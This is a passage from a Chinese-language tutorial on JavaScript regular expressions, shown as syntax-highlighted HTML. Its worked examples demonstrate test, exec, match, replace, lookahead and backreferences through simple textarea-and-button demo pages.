class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配un前缀的反义词"</span> <span class="attr">onclick</span>=<span class="string">"t5();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配单词中间的hi部分"</span> <span class="attr">onclick</span>=<span class="string">"t6();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配输入的名字是不是lisi"</span> <span class="attr">onclick</span>=<span class="string">"t7();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/hi/</span>;<span class="comment">//仅仅是看字符串中有没有hi</span></span></span><br><span class="line"><span class="javascript">            alert(reg.test(cv));<span class="comment">//满足 返回true  不满足 返回false</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//var reg = /\bhi.+/;// 错误1 匹配hi开头的单词</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">////var reg = /\bhi\w+/;// 错误2</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bhi\w*/</span>; </span></span><br><span class="line"><span class="javascript">            alert(reg.exec(cv));<span class="comment">//exec返回一个对象  没找到返回none</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bhi/</span>;<span class="comment">//正则测试hi开头的单词但不是hi</span></span></span><br><span class="line"><span class="javascript">            alert(reg.exec(cv));<span class="comment">//exec返回一个对象  没找到返回none</span></span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\b[\w]+ing\b/</span>;<span class="comment">//*表示匹配0-无穷  +表示匹配1-无穷</span></span></span><br><span class="line"><span class="undefined">            alert(reg.exec(cv));</span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t5</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bun[\w]+\b/</span>;<span class="comment">//匹配un前缀的反义词</span></span></span><br><span class="line"><span class="undefined">            alert(reg.exec(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t6</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\Bhi\B/</span>;<span class="comment">//匹配单词中间的hi部分</span></span></span><br><span class="line"><span class="undefined">            alert(reg.exec(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t7</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/^lisi$/</span>;<span class="comment">//匹配输入的名字是不是lisi</span></span></span><br><span class="line"><span class="undefined">            alert(reg.exec(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-4-例4-正则应用字符串"><a href="#4-4-例4-正则应用字符串" class="headerlink" title="4.4 例4 正则应用字符串"></a>4.4 例4 正则应用字符串</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/dmaOPz" target="_blank" rel="noopener">https://codepen.io/poetries/pen/dmaOPz</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>正则应用字符串<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"查找中间含有hi的单词"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"查找所有中间含有hi的单词"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"查找所有中间含有hi的单词，不区分大小写"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"替换JavaScript标签"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"把连接换成空连接"</span> <span class="attr">onclick</span>=<span class="string">"t5();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"把每一行的结尾的数字换成#"</span> <span class="attr">onclick</span>=<span class="string">"t6();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"替换goods中多余的O"</span> <span class="attr">onclick</span>=<span class="string">"t7();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\Bhi\B/</span>;<span class="comment">//查找中间含有hi的单词</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\Bhi\B/g</span>;<span class="comment">//查找所有中间含有hi的单词</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\Bhi\B/gi</span>;<span class="comment">//查找所有中间含有hi的单词  g是全局 i ignore 忽略大小写</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  reg = <span class="regexp">/&lt;script.*&lt;\/script&gt;/</span>;<span class="comment">//替换JavaScript标签</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">'哈哈哈'</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t5</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="undefined">              /*</span></span><br><span class="line"><span class="undefined">                        . 代表任意,但不包括换行</span></span><br><span class="line"><span class="undefined">                        可以用一对反义词来匹配所有. \d\D等</span></span><br><span class="line"><span class="undefined">                        不能跨行（贪婪模式）</span></span><br><span class="line"><span class="undefined">                  */</span></span><br><span class="line"><span class="undefined">                 </span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/&lt;a[\s]+[\d\D]*&lt;\/a&gt;/</span>; <span class="comment">//正则替换链接</span></span></span><br><span class="line"><span class="xml">                    alert(cv.replace(reg,'<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>文字<span class="tag">&lt;/<span class="name">a</span>&gt;</span>')); </span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t6</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  reg = <span class="regexp">/\d+$/gm</span>;<span class="comment">//把每一行的结尾的数字换成#   m 多行模式</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">'#'</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t7</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  reg = <span class="regexp">/go&#123;3,&#125;?ds/</span>;<span class="comment">//替换goods中多余的O</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">'goods'</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-5-例5-预查"><a href="#4-5-例5-预查" class="headerlink" title="4.5 例5-预查"></a>4.5 例5-预查</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/MVLbwW" target="_blank" rel="noopener">https://codepen.io/poetries/pen/MVLbwW</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>预查<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配进行时的单词"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配进行时的单词的词根部分,正向预查"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"查找winxp,负向预查"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"找出un*系列单词的词根"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\b[\w]+ing\b/</span>;</span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\b[\w]+(?=ing)/g</span>;<span class="comment">//匹配进行时的单词的词根部分  不要ing结尾  预查不消耗字符</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bwin(?!95)/g</span>;<span class="comment">//win98 win97 win95 win32 winxp win2003要求把win95过滤</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//var reg = /\w+(?&lt;=un)/g;//找出un*系列单词的词根  js不支持向前正向预查</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-6-例6-反向引用"><a href="#4-6-例6-反向引用" class="headerlink" title="4.6 例6-反向引用"></a>4.6 例6-反向引用</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/LdqbVL" target="_blank" rel="noopener">https://codepen.io/poetries/pen/LdqbVL</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>反向引用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"把连接换成空连接，保留文字"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="xml">            var reg = /<span class="tag">&lt;<span class="name">a[\s]+[^</span>&gt;</span>]+&gt;([^<span class="tag">&lt;&gt;</span>]+)<span class="tag">&lt;<span class="name">\</span>/<span class="attr">a</span>&gt;</span>/; //链接表达式  这个一部分是子表达式 ([^<span class="tag">&lt;&gt;</span>]+)</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// alert(reg.exec(cv)); </span></span></span><br><span class="line"><span class="undefined">                    </span></span><br><span class="line"><span class="xml">                alert(cv.replace(reg,'<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>"&gt;</span>$1<span class="tag">&lt;/<span class="name">a</span>&gt;</span>'));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-7-例7-正则练习"><a href="#4-7-例7-正则练习" class="headerlink" title="4.7 例7-正则练习"></a>4.7 例7-正则练习</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/dmaOYV" target="_blank" rel="noopener">https://codepen.io/poetries/pen/dmaOYV</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 